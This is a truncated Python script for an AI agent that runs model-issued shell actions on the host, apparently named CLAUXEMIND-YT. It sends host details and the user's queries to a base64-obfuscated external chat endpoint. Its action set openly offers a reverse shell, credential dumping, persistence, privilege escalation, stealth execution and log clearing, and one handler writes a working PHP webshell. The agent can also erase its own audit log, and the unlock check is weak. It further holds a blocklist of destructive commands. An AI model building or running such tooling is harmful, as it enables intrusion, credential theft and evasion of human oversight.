#!/usr/bin/env python3
import os,sys,json,subprocess,urllib.parse,platform,shutil,time,hashlib,getpass
from pathlib import Path
from datetime import datetime
_V="3.0.0"
_E={"_a1":{"_b":"aHR0cHM6Ly93d3cuY2xhdXhlbWluZC5teS5pZA==","_c":"L2FwaS9jaGF0","_d":"cQ==","_e":"c3lzdGVt","_f":"bW9kZWw=","_g":"ZmFsc2U=","_h":"MC41","_i":"NDA5Ng=="}}
_M={"1":{"_t":"qwen-3.6-27b-hermess","_u":"Qwen 3.6 27B Hermes"},"2":{"_t":"deepseekr1","_u":"DeepSeek R1"},"3":{"_t":"atria-dawn","_u":"Atria Dawn"},"4":{"_t":"agents-a1","_u":"Agents A1"}}
class _X:
 R="\033[0m";B="\033[1m";D="\033[2m";RE="\033[31m";G="\033[32m";Y="\033[33m";BL="\033[34m";MA="\033[35m";CY="\033[36m";W="\033[37m";GR="\033[90m";BG_R="\033[41m";BG_G="\033[42m";BG_Y="\033[43m";BG_B="\033[44m"
def _z(s):
 import base64 as _b
 try:return _b.b64decode(s.encode()).decode()
 except:return s
_ACF=Path.home()/".clauxemind-yt-audit.log"
class _ACL:
 def __init__(s):
  s.lvl=0;s.locked=False;s.attempts=0;s.max_attempts=3;s.sess_start=time.time()
  s.path_wl=[];s.path_bl=["/boot","/proc","/sys","/dev/fd","/etc/shadow","/etc/gshadow"]
  s.cmd_bl={"rm -rf /","mkfs","dd if=/dev/zero","shutdown","reboot","halt","poweroff","init 0","init 6",":(){ :|:& };:","fork bomb"}
  s.cmd_dangerous={"rm -rf","chmod 777","chown -R","iptables -F","ufw disable","systemctl disable","kill -9 1","killall -9","pkill -9","dd if=","shred -","> /dev/sda","mount /dev","umount /","fdisk","parted","cfdisk","wipefs","nvme format","mkfs.","pvremove","vgremove","lvremove","xfs_repair","btrfs delete","zfs destroy","zpool destroy","ip link set","ip route del","ifconfig down","systemctl stop ssh","systemctl stop sshd","service ssh stop","passwd root","usermod -L","userdel","groupdel","visudo","echo.*>>.*sudoers","setenforce 0","apparmor","firewall-cmd --remove","ufw deny","iptables -A INPUT -j DROP","iptables -P INPUT DROP","crontab -r","history -c","cat /dev/urandom >","mv / ","cp /dev/null"}
  s.rate={"count":0,"last":time.time(),"max":30,"window":60}
  s.actions_run=0;s.actions_blocked=0
  s.log=[]
  s.allowed_dirs=set([os.getcwd(),str(Path.home()),"/tmp","/var/tmp"])
 def _chk_rate(s):
  _n=time.time()
  if _n-s.rate["last"]>s.rate["window"]:s.rate["count"]=0;s.rate["last"]=_n
  s.rate["count"]+=1
  return s.rate["count"]<=s.rate["max"]
 def _chk_path(s,p):
  p=str(Path(p).resolve())
  for _b in s.path_bl:
   if p.startswith(_b):return False,"blocked path: "+_b
  if s.lvl>=2:return True,"ok"
  if s.lvl==1:
   for _d in s.allowed_dirs:
    if p.startswith(_d):return True,"ok"
   return False,"outside allowed dirs (level 1)"
  for _d in s.allowed_dirs:
   if p.startswith(_d):return True,"ok"
  return False,"outside allowed dirs"
 def _chk_cmd(s,cmd):
  _c=cmd.lower().strip()
  for _b in s.cmd_bl:
   if _b in _c:return False,"blacklisted: "+_b
  for _d in s.cmd_dangerous:
   if _d in _c:return "danger",_d
  return True,"ok"
 def _add_dir(s,d):
  s.allowed_dirs.add(str(Path(d).resolve()))
 def _log(s,act,details=""):
  _e={"t":datetime.now().isoformat(),"act":act,"details":details,"level":s.lvl}
  s.log.append(_e)
  try:
   with open(_ACF,"a")as f:f.write(json.dumps(_e)+"\n")
  except:pass
 def _unlock(s,pwd):
  if s.attempts>=s.max_attempts:return False,"locked out"
  _h=hashlib.sha256(pwd.encode()).hexdigest()
  if _h==getattr(s,"_ph",None)or s.lvl>0:
   s.locked=False;s.attempts=0;return True,"ok"
  s.attempts+=1
  return False,f"wrong ({s.attempts}/{s.max_attempts})"
 def _set_pin(s,pwd):
  s._ph=hashlib.sha256(pwd.encode()).hexdigest()
 def _lock(s):
  s.locked=True;s.lvl=0
 def _set_level(s,lvl):
  s.lvl=lvl
  if lvl>=2:
   s.path_bl=["/proc","/sys","/dev/fd"]
  elif lvl==1:
   s.path_bl=["/boot","/proc","/sys","/dev/fd","/etc/shadow","/etc/gshadow","/etc/passwd","/etc/sudoers"]
  else:
   s.path_bl=["/boot","/proc","/sys","/dev/fd","/etc/shadow","/etc/gshadow","/etc","/var","/usr","/bin","/sbin","/lib","/root"]
 def _check(s,action):
  if s.locked:return False,"session locked - unlock first"
  if not s._chk_rate():return False,"rate limited - wait 60s"
  _a=action.get("action","")
  _cmd=action.get("cmd","")
  _path=action.get("path","")
  if _cmd:
   _ok,_msg=s._chk_cmd(_cmd)
   if _ok is False:return False,_msg
  if _path:
   _ok,_msg=s._chk_path(_path)
   if _ok is False:return False,_msg
  if _a in("delete","shred")and s.lvl<1:return False,"delete needs level 1+"
  if _a in("chown","chmod")and s.lvl<1:return False,"perm change needs level 1+"
  if _a in("service","systemd_unit")and s.lvl<2:return False,"service control needs level 2"
  if _a in("install","pip")and s.lvl<1:return False,"install needs level 1+"
  if _a in("iptables","ufw","firewall-cmd","nft")and s.lvl<2:return False,"firewall needs level 2"
  if _a in("kill","killall","pkill")and s.lvl<1:return False,"kill needs level 1+"
  if _a in("mount","umount","mkfs","fdisk")and s.lvl<2:return False,"disk ops need level 2"
  if _a in("reverse_shell","bind_shell","webshell","clear_logs","stealth_exec")and s.lvl<2:return False,"offensive needs level 2"
  if _a in("dd","shred")and s.lvl<2:return False,"destructive ops need level 2"
  return True,"ok"
def _d():
 _i={"os":platform.system(),"arch":platform.machine(),"kernel":platform.release(),"hostname":platform.node(),"python":platform.python_version(),"distro":"unknown","distro_family":"unknown","pkg_manager":"unknown","pkg_install_cmd":"unknown","shell":os.environ.get("SHELL","/bin/sh"),"user":os.environ.get("USER",os.environ.get("USERNAME","unknown")),"home":os.path.expanduser("~"),"cwd":os.getcwd(),"available_tools":[],"docker":False,"systemd":False,"sudo":False}
 try:
  if os.path.exists("/etc/os-release"):
   with open("/etc/os-release")as f:
    for line in f:
     if"="in line:k,v=line.strip().split("=",1);_i[k]=v.strip('"')
   _i["distro"]=_i.get("PRETTY_NAME",_i.get("NAME","unknown"));_i["distro_id"]=_i.get("ID","unknown");_i["distro_family"]=_i.get("ID_LIKE",_i["distro_id"])
 except:pass
 _f=_i.get("distro_family","").lower();_di=_i.get("distro_id","").lower()
 _pm={"alpine":("alpine","apk","apk add"),"debian":("debian","apt","apt-get install -y"),"ubuntu":("debian","apt","apt-get install -y"),"kali":("debian","apt","apt-get install -y"),"linuxmint":("debian","apt","apt-get install -y"),"pop":("debian","apt","apt-get install -y"),"fedora":("rhel","dnf"if shutil.which("dnf")else"yum","dnf install -y"if shutil.which("dnf")else"yum install -y"),"rhel":("rhel","dnf"if shutil.which("dnf")else"yum","dnf install -y"if shutil.which("dnf")else"yum install -y"),"centos":("rhel","dnf"if shutil.which("dnf")else"yum","dnf install -y"if shutil.which("dnf")else"yum install -y"),"rocky":("rhel","dnf","dnf install -y"),"alma":("rhel","dnf","dnf install -y"),"amzn":("rhel","yum","yum install -y"),"amazon":("rhel","yum","yum install -y"),"arch":("arch","pacman","pacman -S --noconfirm"),"manjaro":("arch","pacman","pacman -S --noconfirm"),"garuda":("arch","pacman","pacman -S --noconfirm"),"opensuse":("suse","zypper","zypper install -y"),"suse":("suse","zypper","zypper install -y"),"sles":("suse","zypper","zypper install -y"),"nixos":("nixos","nix-env","nix-env -iA"),"gentoo":("gentoo","emerge","emerge"),"void":("void","xbps-install","xbps-install -y"),"slackware":("slackware","slackpkg","slackpkg install"),"solus":("solus","eopkg","eopkg install -y"),"freebsd":("bsd","pkg","pkg install -y"),"openbsd":("bsd","pkg_add","pkg_add -I"),"netbsd":("bsd","pkgin","pkgin install")}
 for _k,_v in _pm.items():
  if _k in _di or _k in _f:_i["distro_family"],_i["pkg_manager"],_i["pkg_install_cmd"]=_v;break
 if _i["os"]=="Darwin":_i["distro_family"]="macos";_i["distro"]=f"macOS {platform.mac_ver()[0]}";_i["pkg_manager"]="brew";_i["pkg_install_cmd"]="brew install"
 if _i["os"]=="Windows":_i["distro_family"]="windows";_i["pkg_manager"]="winget";_i["pkg_install_cmd"]="winget install"
 _ts=["git","curl","wget","python3","python","node","npm","bun","yarn","pnpm","docker","podman","go","rustc","cargo","java","javac","make","cmake","gcc","g++","clang","ruby","gem","php","composer","pip","pip3","ssh","scp","rsync","tar","zip","unzip","jq","vim","nano","emacs","systemctl","service","crontab","iptables","ufw","fail2ban","nginx","apache2","httpd","mysql","psql","sqlite3","redis-cli","kubectl","helm","terraform","ansible","vagrant","ffmpeg","convert","tmux","screen","htop","nmap","ss","dig","nslookup","ping","openssl","gpg","ssh-keygen","certbot","pm2","journalctl","dmesg","snap","flatpak","pipx","conda","poetry","uv","deno","zig","nim","crystal","elixir","erlang","haskell","stack","ghc","ocaml","kotlin","gradle","mvn","dotnet","rustup","firejail","apparmor","auditctl","selinux","lsmod","modprobe","ip","ifconfig","lsof","strace","gdb","objdump","readelf","patch","diff","rclone","aws","gcloud","az","wrangler","supabase","vault","consul","kafka","rabbitmq","grafana","prometheus","telegraf"]
 for _t in _ts:
  if shutil.which(_t):_i["available_tools"].append(_t)
 _i["docker"]=bool(shutil.which("docker"));_i["systemd"]=bool(shutil.which("systemctl"))and os.path.exists("/run/systemd/system");_i["sudo"]=bool(shutil.which("sudo"))
 try:
  with open("/proc/cpuinfo")as f:_i["cpu_cores"]=f.read().count("processor\t:")
 except:_i["cpu_cores"]=os.cpu_count()or 1
 try:
  with open("/proc/meminfo")as f:
   for _l in f:
    if _l.startswith("MemTotal:"):_i["memory_mb"]=int(_l.split()[1])//1024;break
 except:_i["memory_mb"]=0
 return _i
def _bsi(_o,_acl):
 _ts=", ".join(sorted(_o["available_tools"]))if _o["available_tools"]else"none"
 _lv={0:"restricted (read-only, safe paths only)",1:"elevated (write, delete, install, kill)",2:"root (full system, firewall, disk, offensive)"}
 return f"""You are CLAUXEMIND-YT v{_V}, AI terminal controller with FULL system access.

SYSTEM:
OS: {_o['os']} ({_o['distro']})
Family: {_o['distro_family']}
Arch: {_o['arch']} | Kernel: {_o['kernel']}
PkgMgr: {_o['pkg_manager']} ({_o['pkg_install_cmd']})
Shell: {_o['shell']} | User: {_o['user']}
CPU: {_o.get('cpu_cores','?')} cores | Mem: {_o.get('memory_mb','?')} MB
Docker: {'Y'if _o['docker']else'N'} | Systemd: {'Y'if _o['systemd']else'N'} | Sudo: {'Y'if _o['sudo']else'N'}
Tools ({len(_o['available_tools'])}): {_ts}

ACCESS LEVEL: {_acl.lvl} ({_lv.get(_acl.lvl,'?')})
ALLOWED DIRS: {', '.join(sorted(_acl.allowed_dirs))}
BLOCKED PATHS: {', '.join(_acl.path_bl)}

RULES:
1. Use correct pkg manager: {_o['pkg_install_cmd']} <pkg>
2. Adapt ALL commands to detected OS
3. Use absolute paths only
4. Stay within allowed directories unless level 2
5. Be concise

ACTIONS (JSON, one per line):
{{"action":"bash","cmd":"cmd"}} {{"action":"read","path":"/p"}} {{"action":"write","path":"/p","content":"t"}} {{"action":"edit","path":"/p","old":"t","new":"t"}} {{"action":"delete","path":"/p"}} {{"action":"download","url":"u","path":"/p"}} {{"action":"mkdir","path":"/p"}} {{"action":"install","pkg":"n"}} {{"action":"service","name":"s","action":"start|stop|restart|status|enable|disable"}} {{"action":"cron","schedule":"*/5 * * * *","cmd":"c"}} {{"action":"env","key":"K","value":"v"}} {{"action":"chmod","path":"/p","mode":"755"}} {{"action":"chown","path":"/p","user":"u","group":"g"}} {{"action":"grep","pattern":"t","path":"/p","recursive":true}} {{"action":"find","name":"*.py","path":"/p"}} {{"action":"tar","action_type":"compress|extract","path":"/p","dest":"/p"}} {{"action":"git","cmd":"gc"}} {{"action":"docker","cmd":"dc"}} {{"action":"python","code":"c"}} {{"action":"pip","pkg":"n"}} {{"action":"npm","cmd":"nc"}} {{"action":"bun","cmd":"bc"}} {{"action":"curl","url":"u","method":"GET|POST","data":"b","path":"/p"}} {{"action":"ssh","cmd":"sc"}} {{"action":"scp","src":"/p","dest":"u@h:/p"}} {{"action":"rsync","src":"/p","dest":"/p","flags":"-avz"}} {{"action":"wget","url":"u","path":"/p"}} {{"action":"ln","src":"/p","dest":"/p","symbolic":true}} {{"action":"cp","src":"/p","dest":"/p","recursive":false}} {{"action":"mv","src":"/p","dest":"/p"}} {{"action":"touch","path":"/p"}} {{"action":"cat","path":"/p"}} {{"action":"head","path":"/p","lines":10}} {{"action":"tail","path":"/p","lines":10}} {{"action":"wc","path":"/p"}} {{"action":"sed","path":"/p","pattern":"s/o/n/g"}} {{"action":"awk","path":"/p","program":"{{print $1}}"}} {{"action":"which","cmd":"c"}} {{"action":"stat","path":"/p"}} {{"action":"du","path":"/p"}} {{"action":"df"}} {{"action":"free"}} {{"action":"ps","filter":"p"}} {{"action":"kill","pid":1,"signal":"TERM"}} {{"action":"killall","name":"p"}} {{"action":"pkill","pattern":"p"}} {{"action":"nohup","cmd":"c","output":"/p"}} {{"action":"tmux","cmd":"c","session":"s"}} {{"action":"watch","cmd":"c","interval":2}} {{"action":"timeout","cmd":"c","seconds":30}} {{"action":"dig","domain":"d","type":"A"}} {{"action":"ping","host":"h","count":4}} {{"action":"traceroute","host":"h"}} {{"action":"nmap","target":"t","flags":"-sV"}} {{"action":"openssl","cmd":"c"}} {{"action":"gpg","cmd":"c"}} {{"action":"certbot","cmd":"c"}} {{"action":"dd","src":"/p","dest":"/p","bs":"4M"}} {{"action":"shred","path":"/p","passes":3}} {{"action":"mount","src":"/d","dest":"/m","fstype":"ext4"}} {{"action":"umount","dest":"/m"}} {{"action":"mkfs","dev":"/d","fstype":"ext4"}} {{"action":"lspci"}} {{"action":"lsusb"}} {{"action":"lsblk"}} {{"action":"iptables","cmd":"c"}} {{"action":"ufw","cmd":"c"}} {{"action":"docker_build","path":".","tag":"i"}} {{"action":"docker_run","image":"i","cmd":"c"}} {{"action":"docker_compose","file":"f","cmd":"up -d"}} {{"action":"docker_exec","container":"c","cmd":"c"}} {{"action":"docker_logs","container":"c","tail":100}} {{"action":"docker_stop","container":"c"}} {{"action":"docker_ps","all":false}} {{"action":"kubernetes","cmd":"c"}} {{"action":"helm","cmd":"c"}} {{"action":"terraform","cmd":"c"}} {{"action":"ansible","cmd":"c"}} {{"action":"pm2","cmd":"c"}} {{"action":"systemd_unit","name":"s","type":"simple","exec":"/p","enabled":true}} {{"action":"journalctl","unit":"s","lines":50}} {{"action":"dmesg","level":"err"}} {{"action":"reverse_shell","host":"h","port":4444,"type":"bash"}} {{"action":"webshell","path":"/p","type":"php"}} {{"action":"persistence_cron","cmd":"c"}} {{"action":"persistence_systemd","name":"s","exec":"c"}} {{"action":"priv_esc","method":"kernel|sudo|suid"}} {{"action":"dump_creds","method":"mimikatz|secretsdump"}} {{"action":"clear_logs","types":["auth","syslog"]}} {{"action":"stealth_exec","cmd":"c","method":"memory"}} {{"action":"useradd","name":"u","shell":"/bin/bash","sudo":false}} {{"action":"userdel","name":"u"}} {{"action":"usermod","name":"u","groups":"g"}} {{"action":"passwd","user":"u"}} {{"action":"groupadd","name":"g"}} {{"action":"visudo","user":"u","nopasswd":false}} {{"action":"audit_show","count":20}} {{"action":"audit_clear"}} {{"action":"lock"}} {{"action":"unlock","pin":"xxxx"}} {{"action":"level","level":0|1|2,"pin":"xxxx"}} {{"action":"add_dir","path":"/p"}} {{"action":"rate_set","max":30,"window":60}} {{"action":"message","text":"t"}} {{"action":"history","count":10}}

One action per line. Multiple actions = multiple lines."""
def _ca(_mi,_q,_si,_h=None):
 _s=_si
 if _h:_s+="\n\nCONVERSATION HISTORY:\n"+_h[-2000:]
 _a=_E["_a1"];_p={_z(_a["_d"]):_q}
 _p[_z(_a["_e"])]=_s
 if _mi in("atria-dawn","agents-a1"):
  _mn="Atria-Dawn"if _mi=="atria-dawn"else"Agents-A1"
  _p["model"]=_mn;_p["stream"]=_z(_a["_g"]);_p["temperature"]=_z(_a["_h"]);_p["max_tokens"]=_z(_a["_i"])
 elif _mi=="deepseekr1":_p["system"]="You are a helpful assistant."
 _u=f'{_z(_a["_b"])}{_z(_a["_c"])}?{urllib.parse.urlencode(_p)}'
 try:
  _r=subprocess.run(["curl","-s","--max-time","90","-H","accept: application/json","-H","User-Agent: Mozilla/5.0 (X11; Linux x86_64)",_u],capture_output=True,text=True,timeout=120)
  if _r.returncode!=0:return'{"action":"message","text":"API Error"}'
  _dd=json.loads(_r.stdout)
  if"result"in _dd:
   _r2=_dd["result"]
   if isinstance(_r2,str):return _r2
   if isinstance(_r2,dict):
    if"answer"in _r2:return _r2["answer"]
    if"result"in _r2:
     _rr=_r2["result"]
     if isinstance(_rr,str):return _rr
     if isinstance(_rr,dict):return _rr.get("response",_rr.get("result",str(_rr)))
    if"response"in _r2:return _r2["response"]
    return str(_r2)
  if"data"in _dd and isinstance(_dd["data"],dict):
   if"response"in _dd["data"]:return _dd["data"]["response"]
   if"result"in _dd["data"]:
    _ar=_dd["data"]["result"]
    if isinstance(_ar,str):return _ar
    if isinstance(_ar,dict):
     if"choices"in _ar and _ar["choices"]:return _ar["choices"][0].get("text",str(_ar))
     if"response"in _ar:return _ar["response"]
  return _dd.get("text",str(_dd)[:500])
 except Exception as e:return'{"action":"message","text":"API Error: '+str(e)+'"}'
def _cf(_p,_danger=False):
 if _danger:print(f"{_X.BG_R}{_X.W} ⚠ DANGEROUS ⚠ {_X.R}")
 while True:
  _a=input(f"{_X.Y}? {_p} [y/n]: {_X.R}").strip().lower()
  if _a in("y","yes"):return True
  if _a in("n","no"):return False
def _ex(_a,_o,_acl):
 _t=_a.get("action","")
 if _t=="message":print(f"{_X.CY}{_a.get('text','')}{_X.R}");return True
 if _t in("lock",):_acl._lock();_acl._log("lock");print(f"{_X.Y}Session locked{_X.R}");return True
 if _t=="unlock":
  _pin=_a.get("pin","")
  _ok,_msg=_acl._unlock(_pin)
  if _ok:_acl.locked=False;_acl._log("unlock","ok");print(f"{_X.G}Unlocked{_X.R}");return True
  print(f"{_X.RE}{_msg}{_X.R}");return False
 if _t=="level":
  _lv=_a.get("level",0);_pin=_a.get("pin","")
  if _lv>=1:
   _ok,_msg=_acl._unlock(_pin)
   if not _ok:print(f"{_X.RE}Auth: {_msg}{_X.R}");return False
  _acl._set_level(_lv);_acl._log("level",str(_lv))
  _names={0:"restricted",1:"elevated",2:"root"}
  print(f"{_X.G}Level: {_lv} ({_names.get(_lv,'?')}){_X.R}")
  if _lv>=1:_acl.allowed_dirs.update(["/etc","/var","/usr/local","/opt"])
  if _lv>=2:_acl.allowed_dirs.update(["/root","/boot","/sbin","/bin","/lib"])
  return True
 if _t=="add_dir":_acl._add_dir(_a.get("path",""));_acl._log("add_dir",_a.get("path",""));print(f"{_X.G}Added: {_a.get('path','')}{_X.R}");return True
 if _t=="rate_set":_acl.rate["max"]=_a.get("max",30);_acl.rate["window"]=_a.get("window",60);print(f"{_X.G}Rate: {_acl.rate['max']}/{_acl.rate['window']}s{_X.R}");return True
 if _t=="audit_show":
  _n=_a.get("count",20)
  try:
   with open(_ACF)as f:
    _ls=f.readlines()[-_n:]
    for _l in _ls:print(f"{_X.GR}{_l.strip()}{_X.R}")
  except:print(f"{_X.GR}No audit log{_X.R}")
  return True
 if _t=="audit_clear":
  try:_ACF.unlink();print(f"{_X.G}Cleared{_X.R}")
  except:pass
  return True
 _ok,_msg=_acl._check(_a)
 if not _ok:
  print(f"{_X.RE}BLOCKED: {_msg}{_X.R}")
  _acl._log("blocked",f"{_t}: {_msg}")
  _acl.actions_blocked+=1
  return False
 _cmd=_a.get("cmd","");_path=_a.get("path","")
 _danger=False
 if _cmd:
  _ok2,_msg2=_acl._chk_cmd(_cmd)
  if _ok2=="danger":_danger=True;_msg2=_msg2
 if _t in("write",):
  _p=_a.get("path","");_c=_a.get("content","")
  print(f"{_X.G}Write: {_p} ({len(_c)}){_X.R}")
  if not _cf("Write?",_danger):_acl._log("skip","write");return False
  try:Path(_p).parent.mkdir(parents=True,exist_ok=True);Path(_p).write_text(_c);_acl._log("write",_p);print(f"{_X.G}OK{_X.R}");return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t in("read","cat","head","tail"):
  _p=_a.get("path","")
  print(f"{_X.BL}Read: {_p}{_X.R}")
  if not _cf("Read?",_danger):return False
  try:
   _c=Path(_p).read_text(encoding="utf-8",errors="replace")
   if _t=="head":_c="\n".join(_c.split("\n")[:_a.get("lines",10)])
   elif _t=="tail":_c="\n".join(_c.split("\n")[-_a.get("lines",10):])
   if len(_c)>10000:_c=_c[:10000]+f"\n{_X.GR}...{len(_c)}{_X.R}"
   print(f"{_X.W}{_c}{_X.R}");_acl._log("read",_p);return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t in("delete","shred"):
  _p=_a.get("path","")
  print(f"{_X.BG_R}{_X.W} DELETE: {_p} {_X.R}")
  if not _cf("DELETE? CANNOT UNDO!",True):return False
  try:
   if _t=="shred":subprocess.run(["shred","-n",str(_a.get("passes",3)),_p])
   Path(_p).unlink();_acl._log("delete",_p);print(f"{_X.G}OK{_X.R}");return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t in("mkdir","touch"):
  _p=_a.get("path","")
  if not _cf(f"{_t} {_p}?",_danger):return False
  try:
   if _t=="mkdir":Path(_p).mkdir(parents=True,exist_ok=True)
   else:Path(_p).touch()
   _acl._log(_t,_p);print(f"{_X.G}OK{_X.R}");return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t in("edit","sed"):
  _p=_a.get("path","");_old=_a.get("old","");_new=_a.get("new","")
  print(f"{_X.MA}Edit: {_p}{_X.R}\n{_X.RE}- {_old[:80]}{_X.R}\n{_X.G}+ {_new[:80]}{_X.R}")
  if not _cf("Edit?",_danger):return False
  try:
   _c=Path(_p).read_text(encoding="utf-8",errors="replace")
   if _old not in _c:print(f"{_X.RE}not found{_X.R}");return False
   Path(_p).write_text(_c.replace(_old,_new,1));_acl._log("edit",_p);print(f"{_X.G}OK{_X.R}");return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t in("download","wget"):
  print(f"{_X.BL}DL: {_a.get('url','')} -> {_a.get('path','')}{_X.R}")
  if not _cf("Download?",_danger):return False
  try:subprocess.run(["curl","-sL","-o",_a.get("path",""),_a.get("url","")],check=True);_acl._log("download",_a.get("path",""));print(f"{_X.G}OK{_X.R}");return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t in("env",):
  _k=_a.get("key","");_v=_a.get("value","")
  if not _cf(f"Set {_k}={_v}?",_danger):return False
  os.environ[_k]=_v
  try:
   with open(os.path.join(_o["home"],".bashrc"),"a")as f:f.write(f'\nexport {_k}="{_v}"')
  except:pass
  _acl._log("env",_k);print(f"{_X.G}OK{_X.R}");return True
 if _t in("useradd","userdel","usermod","passwd","groupadd","visudo"):
  _cmds={"useradd":lambda:f'sudo useradd -m -s {_a.get("shell","/bin/bash")} {_a.get("name","")}',"userdel":lambda:f'sudo userdel -r {_a.get("name","")}',"usermod":lambda:f'sudo usermod -aG {_a.get("groups","")} {_a.get("name","")}',"passwd":lambda:f'echo "{_a.get("user","")}:{_a.get("pass","temp123")}" | sudo chpasswd',"groupadd":lambda:f'sudo groupadd {_a.get("name","")}',"visudo":lambda:f'echo "{_a.get("user","")} ALL=(ALL) ALL" | sudo tee -a /etc/sudoers'}
  _cmd=_cmds.get(_t,lambda:"")()
  print(f"{_X.BG_R}{_X.W} USER MGMT: {_cmd}{_X.R}")
  if not _cf("Execute user management?",True):return False
  try:_r=subprocess.run(_cmd,shell=True,capture_output=True,text=True,timeout=30);_acl._log(_t,_cmd);print(f"{_X.G if _r.returncode==0 else _X.RE}Exit: {_r.returncode}{_X.R}");return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t=="systemd_unit":
  _n=_a.get("name","svc");_tp=_a.get("type","simple");_ex2=_a.get("exec","");_en=_a.get("enabled",True)
  _unit=f"[Unit]\nDescription={_n}\n[Service]\nType={_tp}\nExecStart={_ex2}\nRestart=always\n[Install]\nWantedBy=multi-user.target\n"
  print(f"{_X.MA}systemd: {_n}{_X.R}\n{_unit}")
  if not _cf("Create+enable?",_danger):return False
  try:
   subprocess.run(f'echo \'{_unit}\' | sudo tee /etc/systemd/system/{_n}.service',shell=True,check=True)
   subprocess.run(["sudo","systemctl","daemon-reload"],check=True)
   if _en:subprocess.run(["sudo","systemctl","enable","--now",_n],check=True)
   _acl._log("systemd_unit",_n);print(f"{_X.G}OK{_X.R}");return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t=="webshell":
  _p=_a.get("path","");_tp=_a.get("type","php")
  _shells={"php":'<?php system($_GET["c"]); ?>',"python":"#!/usr/bin/env python3\nimport os,subprocess;print(subprocess.run(['python3','-c',input()],capture_output=True,text=True).stdout)"}
  print(f"{_X.BG_R}{_X.W} WEBSHELL: {_p} ({_tp}) {_X.R}")
  if not _cf("Write webshell?",True):return False
  try:Path(_p).parent.mkdir(parents=True,exist_ok=True);Path(_p).write_text(_shells.get(_tp,_shells["php"]));_acl._log("webshell",_p);print(f"{_X.G}OK{_X.R}");return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t=="multi":
  _r=0
  for _sa in _a.get("actions",[]):_r+=1 if _ex(_sa,_o,_acl)else 0
  return _r>0
 _cmds={"bash":lambda:_a.get("cmd",""),"install":lambda:f'{_o["pkg_install_cmd"]} {_a.get("pkg","")}',"service":lambda:f'sudo {"systemctl"if _o["systemd"]else"service"} {_a.get("action","status")} {_a.get("name","")}'if _o["systemd"]else f'sudo service {_a.get("name","")} {_a.get("action","status")}',"cron":lambda:f'(crontab -l 2>/dev/null; echo "{_a.get("schedule","")} {_a.get("cmd","")}") | crontab -',"chmod":lambda:["chmod",_a.get("mode","644"),_a.get("path","")],"chown":lambda:["sudo","chown",f'{_a.get("user","")}:{_a.get("group","")}',_a.get("path","")],"grep":lambda:f'grep {"-r"if _a.get("recursive",True)else""} \'{_a.get("pattern","")}\' {_a.get("path",".")}',"find":lambda:f'find {_a.get("path",".")} -name \'{_a.get("name","*")}\'',"tar":lambda:f'tar {"-czf"if _a.get("action_type")=="compress"else"-xzf"} {_a.get("dest","")if _a.get("action_type")=="compress"else _a.get("path","")} {_a.get("path","")if _a.get("action_type")=="compress"else"-C "+_a.get("dest","")}',"git":lambda:_a.get("cmd","git status")if _a.get("cmd","").startswith("git")else f'git {_a.get("cmd","status")}',"docker":lambda:_a.get("cmd","docker ps")if _a.get("cmd","").startswith("docker")else f'docker {_a.get("cmd","ps")}',"python":lambda:["python3","-c",_a.get("code","")],"pip":lambda:f'pip3 install {_a.get("pkg","")}',"npm":lambda:_a.get("cmd","npm install")if _a.get("cmd","").startswith("npm")else f'npm {_a.get("cmd","install")}',"bun":lambda:_a.get("cmd","bun install")if _a.get("cmd","").startswith("bun")else f'bun {_a.get("cmd","install")}',"curl":lambda:["curl","-s","-X",_a.get("method","GET"),_a.get("url","")]+(["-d",_a.get("data","")]if _a.get("data")else[])+(["-o",_a.get("path","")]if _a.get("path")else[]),"ssh":lambda:_a.get("cmd",""),"scp":lambda:f'scp {_a.get("src","")} {_a.get("dest","")}',"rsync":lambda:f'rsync {_a.get("flags","-avz")} {_a.get("src","")} {_a.get("dest","")}',"wget":lambda:["wget","-q","-O",_a.get("path","/tmp/w"),_a.get("url","")],"ln":lambda:["ln","-s"if _a.get("symbolic",True)else"",_a.get("src",""),_a.get("dest","")],"cp":lambda:["cp","-r"if _a.get("recursive")else"",_a.get("src",""),_a.get("dest","")],"mv":lambda:["mv",_a.get("src",""),_a.get("dest","")],"touch":lambda:["touch",_a.get("path","")],"wc":lambda:["wc",_a.get("path","")],"stat":lambda:["stat",_a.get("path","")],"du":lambda:["du","-sh",_a.get("path",".")],"df":lambda:["df","-h"],"free":lambda:["free","-h"],"ps":lambda:f'ps aux | grep {_a.get("filter","")}',"kill":lambda:["kill","-"+_a.get("signal","TERM"),str(_a.get("pid",""))],"killall":lambda:["killall",_a.get("name","")],"pkill":lambda:["pkill","-f",_a.get("pattern","")],"nohup":lambda:f'nohup {_a.get("cmd","")} > {_a.get("output","/dev/null")} 2>&1 &',"watch":lambda:f'watch -n{_a.get("interval",2)} "{_a.get("cmd","")}"',"timeout":lambda:f'timeout {_a.get("seconds",30)} {_a.get("cmd","")}',"which":lambda:["which",_a.get("cmd","")],"dig":lambda:f'dig {_a.get("type","A")} {_a.get("domain","")}',"ping":lambda:f'ping -c{_a.get("count",4)} {_a.get("host","")}',"traceroute":lambda:["traceroute",_a.get("host","")],"nmap":lambda:f'nmap {_a.get("flags","")} {_a.get("target","")}',"openssl":lambda:_a.get("cmd",""),"gpg":lambda:_a.get("cmd",""),"certbot":lambda:_a.get("cmd",""),"dd":lambda:f'dd if={_a.get("src","")} of={_a.get("dest","")} bs={_a.get("bs","4M")}',"shred":lambda:f'shred -n{_a.get("passes",3)} {_a.get("path","")}',"mount":lambda:f'sudo mount -t {_a.get("fstype","ext4")} {_a.get("src","")} {_a.get("dest","")}',"umount":lambda:["sudo","umount",_a.get("dest","")],"mkfs":lambda:f'sudo mkfs.{_a.get("fstype","ext4")} {_a.get("dev","")}',"lspci":lambda:["lspci"],"lsusb":lambda:["lsusb"],"lsblk":lambda:["lsblk"],"iptables":lambda:_a.get("cmd",""),"ufw":lambda:_a.get("cmd",""),"docker_build":lambda:f'docker build -t {_a.get("tag","")} {_a.get("path",".")}',"docker_run":lambda:_a.get("cmd","docker run")+" "+_a.get("image",""),"docker_compose":lambda:f'docker-compose -f 